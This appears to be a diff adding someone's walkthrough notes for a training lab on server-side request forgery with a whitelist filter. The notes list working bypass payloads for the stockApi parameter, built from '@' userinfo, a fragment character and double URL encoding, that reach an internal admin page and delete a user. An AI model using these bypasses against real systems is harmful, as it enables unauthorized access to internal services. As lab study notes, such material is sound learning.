@@ -1,0 +1,19 @@
+SSRF with whitelist-based input filter
+Vulnerable feature - stock check functionality
+Goal: Change the stock check URL to access the admin interface at http://localhost/admin and delete carlos
+
+1)
+-Check stock
+-Send to repeater
+-URL Decode, http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
+-http://localhost - Doesn't work
+-App is looking for a specific host name, stock.weliketoshop.net
+
+2)
+-stockApi=http://localhost@stock.weliketoshop.net - Can't connect
+-stockApi=http://localhost#@stock.weliketoshop.net - Must be stock...
+# is a fragment
+-stockApi=http://localhost#@stock.weliketoshop.net - URL encode, Must be stock...
+-stockApi=http://localhost%25%323@stock.weliketoshop.net - Double URL encode - works
+-stockApi=http://localhost%2523@stock.weliketoshop.net/admin - works
+-stockApi=http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos
